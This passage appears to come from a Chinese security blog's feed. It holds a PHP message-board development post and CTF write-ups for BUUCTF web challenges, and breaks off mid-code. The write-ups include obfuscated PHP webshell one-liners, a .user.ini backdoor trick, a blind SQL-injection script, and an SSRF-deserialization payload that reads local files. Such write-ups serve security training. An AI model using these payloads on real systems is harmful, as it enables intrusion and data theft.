class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$呵&#x3D;&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot;;$&#123;$呵&#125;[呵]($&#123;$呵&#125;[呵]);&amp;呵&#x3D;getFlag</span><br><span class="line">$%7F&#x3D;&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%1C%1E%0F%3d%17%1A%1C&quot;;$%7F();</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h2 id=&quot;Day1&quot;&gt;&lt;a href=&quot;#Day1&quot; class=&quot;headerlink&quot; title=&quot;Day1&quot;&gt;&lt;/a&gt;Day1&lt;/h2&gt;&lt;h4 id=&quot;in-array-函数漏洞&quot;&gt;&lt;a href=&quot;#in-array-函数漏洞&quot; class=&quot;headerlink&quot; title=&quot;in_array()函数漏洞&quot;&gt;&lt;/a&gt;in_array()函数漏洞&lt;/h4&gt;&lt;img src=&quot;/PHP-Audit-Labs%E7%BB%83%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png&quot; class title=&quot;Da4er&quot;&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://da4er.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://da4er.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>PHP留言板开发</title>
    <link href="https://da4er.top/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91.html"/>
    <id>https://da4er.top/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91.html</id>
    <published>2020-03-03T12:59:59.000Z</published>
    <updated>2020-03-03T13:12:21.440Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经过两天的奋斗，终于把一套简单的PHP留言板开发完成了。这套源码从前台到后台，最后到数据库都是一步一步来完成的，主要是为了熟悉一下PHP开发的基本流程和一些功能点的设计思路，为了接下来的代码审计做准备。<br><a id="more"></a></p><hr><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>首先设计前端页面，前端页面主要使用的boostraps框架(因为这个框架简单好用23333…)。自己也不会前端，所以用到什么就去Boostrap官网现找。<br>其次是设计数据库，数据库的话需要三张表：user表，comment表，admin表。<br>设计代码如下：<br>comment：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table comment(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    comment varchar(255) not null,</span><br><span class="line">    primary key(id)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8 comment &quot;评论表&quot;</span><br></pre></td></tr></table></figure></p><hr><p>user表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create table user(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    username varchar(255) not null ,</span><br><span class="line">    password varchar(255) not null ,</span><br><span class="line">    email varchar(255) not null,</span><br><span class="line">    comment varchar(255) not nul ,</span><br><span class="line">    join_date date not null ,</span><br><span class="line">    primary key(id),</span><br><span class="line">    unique key(username),</span><br><span class="line">    unique key(password)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8;</span><br></pre></td></tr></table></figure></p><hr><p>admin表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create table admin(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    username varchar(255) not null,</span><br><span class="line">    password varchar(255) not null,</span><br><span class="line">    primary key(id)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8</span><br><span class="line"></span><br><span class="line">insert into admin(username,password) values (&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39;);</span><br></pre></td></tr></table></figure></p><hr><h3 id="功能点分析"><a href="#功能点分析" class="headerlink" title="功能点分析"></a>功能点分析</h3><p>在设计后台代码的时候，首先是分析功能点，这个很重要。<strong>因为大网站都是靠一个个小的功能点堆积起来的。</strong><br>这个留言板主要的功能为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用户注册</span><br><span class="line">用户登录</span><br><span class="line">密码找回</span><br><span class="line">个人信息设置(信息更新 头像上传)</span><br><span class="line">留言发布</span><br><span class="line">留言展示</span><br><span class="line">前台留言分页展示</span><br><span class="line">搜索界面</span><br><span class="line">管理员后台登录</span><br><span class="line">后台用户管理</span><br><span class="line">后台留言管理</span><br></pre></td></tr></table></figure><br>所以在写的时候，要一个功能一个功能的去实现。</p><hr><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>代码就不展示了，太多了23333….. 最后放几张效果图吧<br><img src="/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91/1.png" class title="Da4er"><br><img src="/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91/2.png" class title="Da4er"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;经过两天的奋斗，终于把一套简单的PHP留言板开发完成了。这套源码从前台到后台，最后到数据库都是一步一步来完成的，主要是为了熟悉一下PHP开发的基本流程和一些功能点的设计思路，为了接下来的代码审计做准备。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发" scheme="https://da4er.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF Web持续更新</title>
    <link href="https://da4er.top/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-03-03T02:47:54.000Z</published>
    <updated>2020-03-10T15:07:09.452Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p><strong>知识点：PHP字符串的解析漏洞。</strong></p><blockquote><p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替，如下图：<br><a id="more"></a><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er"></p></blockquote><p>当我们传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20%20da4[er%00&#x3D;42&quot;+AND+1&#x3D;0–</span><br></pre></td></tr></table></figure><br>PHP在解析的时候会自动将不合法的字符转换，转换规则如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.删除空白符</span><br><span class="line"></span><br><span class="line">2.将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure><br>所以上面的参数最后会变成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">da4_er&#x3D;42&quot; AND 1&#x3D;0–</span><br></pre></td></tr></table></figure><br>从而绕过一些waf的检测。<br><strong>解题：</strong><br>查看网页源代码发现题目存在waf，同时发现calc.php的后台处理程序。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er"><br>访问calc.php:<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><br>当我们传入非int型的参数后，会被waf拦截：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><br>但是可以传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格num</span><br></pre></td></tr></table></figure><br>绕过waf检测。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><br>绕过之后就是简单的代码执行，但是过滤了一些特殊字符，可以使用chr()函数绕过。<br>首先通过scandir扫描根目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><br>最后通过file_get_contents函数读取文件内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</span><br></pre></td></tr></table></figure><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er"></p><hr><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p><strong>知识点：.user.ini创建隐藏后门。</strong></p><blockquote><p>.user.ini中设置php.ini中PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI 模式的服务器上都可以使用.user.ini。</p></blockquote><p>利用方法：.user.ini可以自定义php.ini，所以我们可以设置两个参<strong>auto_prepend_file和auto_append_file</strong><br>这两个参数的意思是：如果在上传的.user.ini目录下，有一个可执行的php文件，那么设置这两个参数后可以自动包含其他的php代码文件，如同：<strong>require和include作用一样。</strong></p><p>唯一不一样的是：auto_prepend_file在文件前插入，auto_append_file在文件后插入。<br>所以我们在.user.ini文件中写入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;da4er.jpg</span><br></pre></td></tr></table></figure><br>那么在该目录下的可执行php文件中，会自动包含：<strong>require(“./da4er.jpg”);</strong></p><p><strong>解题：</strong><br>首先上传一个小马图片，这个题目作了三个限制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不能上传ph或php结尾的，</span><br><span class="line">存在文件头过滤，需要添加图片文件的文件头</span><br><span class="line">文件的内容不能包含&lt;?，但可以上传&lt;script language&#x3D;&#39;php&#39;&gt;&lt;scirpt&gt;类型的图片马来绕过。</span><br></pre></td></tr></table></figure><br>上传后发现目录下还存在一个index.php，这就给利用.user.ini提供了条件<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er"><br>所以直接上传.user.ini文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;script.jpg</span><br></pre></td></tr></table></figure><br>便可得到flag。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er"></p><hr><h3 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h3><p><strong>知识点：布尔盲注，绕过过滤空格的sql注入。</strong><br>绕过空格：<br>可以使用一些url编码的特殊字符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(%09,%0a,%0b,%0c,%0d,%20,%a0 )来替换空格，用or &#39;1&#39;&#x3D;&#39;1的方式闭合后面的引号，这样就可以绕过空格加注释过滤的sql注入。</span><br></pre></td></tr></table></figure><br>使用括号()</p><hr><p>布尔盲注：正确和错误返回不一样。</p><hr><p><strong>解题：</strong><br>首先拿到题目，简单测试一下发现有过滤，看到id知道是数字型的注入。<br>先fuzz一下：<br>发现过滤了空格，and，or，/**/等关键字，但是ascii和substr没有被过滤，想到布尔盲注。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/10.png" class title="Da4er"><br>在测试一下，这题是否可以使用布尔盲注，发现正确和错误返回不一样，所以就可以写脚本了。<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/11.png" class title="Da4er"><br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/12.png" class title="Da4er"><br>脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;c2f8d78b-be94-4e32-9389-c13225236eb1.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">x &#x3D; string.printable</span><br><span class="line"># print(x)</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &quot;id&quot;:&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,60):</span><br><span class="line">    for j in x:</span><br><span class="line">        data[&quot;id&quot;] &#x3D; &quot;1&#x3D;(ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%s)&#x3D;1&quot;%(i,ord(j))</span><br><span class="line">        resp &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">        if &quot;Hello&quot; in resp.text:</span><br><span class="line">            flag +&#x3D;j</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><hr><h3 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h3><p><strong>知识点</strong>：SSRF漏洞利用，PHP反序列化，SQL注入<br>在php代码中使用curl_exec函数访问内网服务器资源的时候，会造成ssrf漏洞。<br>PHP反序列化，调用魔法函数。</p><hr><p><strong>解题：</strong><br>扫描目录发现有个备份文件：<br>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();                                   &#x2F;&#x2F;初始化一个curl会话</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);                 &#x2F;&#x2F;设置需要抓取的URL</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         &#x2F;&#x2F;设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上</span><br><span class="line">        $output &#x3D; curl_exec($ch);                            &#x2F;&#x2F;运行cURL，请求网页</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);          &#x2F;&#x2F;关闭一个curl会话，唯一的参数是curl_init()函数返回的句柄</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>发现get函数会造成ssrf漏洞，接着去测试发现在view.php页面存在sql注入。<br>而且union select在一起会被过滤，可以使用/**/进行绕过。<br>所以可以直接构造反序列化，获取flag.php文件。<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure><br>得到flag：<br><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/14.png" class title="Da4er"></p><hr><h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>打开网页查看源代码，可以查看到格式化之后的代码。源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python#encoding&#x3D;utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport json</span><br><span class="line"></span><br><span class="line">reload(sys)sys.setdefaultencoding(&#39;latin1&#39;)</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key &#x3D; os.urandom(16)</span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action &#x3D; action</span><br><span class="line">        self.param &#x3D; param</span><br><span class="line">        self.sign &#x3D; sign</span><br><span class="line">        self.sandbox &#x3D; md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result &#x3D; &#123;&#125;</span><br><span class="line">        result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)</span><br><span class="line">                resp &#x3D; scan(self.param)</span><br><span class="line">                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&#39;data&#39;] &#x3D; resp</span><br><span class="line">                else:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)</span><br><span class="line">                result[&#39;code&#39;] &#x3D; 200</span><br><span class="line">                result[&#39;data&#39;] &#x3D; f.read()</span><br><span class="line">            if result[&#39;code&#39;] &#x3D;&#x3D; 500:</span><br><span class="line">                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#39;code&#39;] &#x3D; 500</span><br><span class="line">            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def challenge():</span><br><span class="line">    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip &#x3D; request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task &#x3D; Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())@app.route(&#39;&#x2F;&#39;)def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check&#x3D;param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.debug &#x3D; False</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;80)</span><br></pre></td></tr></table></figure><br>看到是python的flask框架，三个路由。先来分析一下这三个路由的作用：<br>geneSign<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br></pre></td></tr></table></figure><br>这个页面主要是通过get或者post方式提交param参数，返回getSign处理的action和param的结果。跟进getSign函数中查看发现是返回md5(secert_key + param + action)。</p><hr><p>De1ta<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])def challenge():</span><br><span class="line">    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip &#x3D; request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task &#x3D; Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br></pre></td></tr></table></figure><br>这个页面是接收action，param，sign参数执行Exec函数，跟进Exec函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 